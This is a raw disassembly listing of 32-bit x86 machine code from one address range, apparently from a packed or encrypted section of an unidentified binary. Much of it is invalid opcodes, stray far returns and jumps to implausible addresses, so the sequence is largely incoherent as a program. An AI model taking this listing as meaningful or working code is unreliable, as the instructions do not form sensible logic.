  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
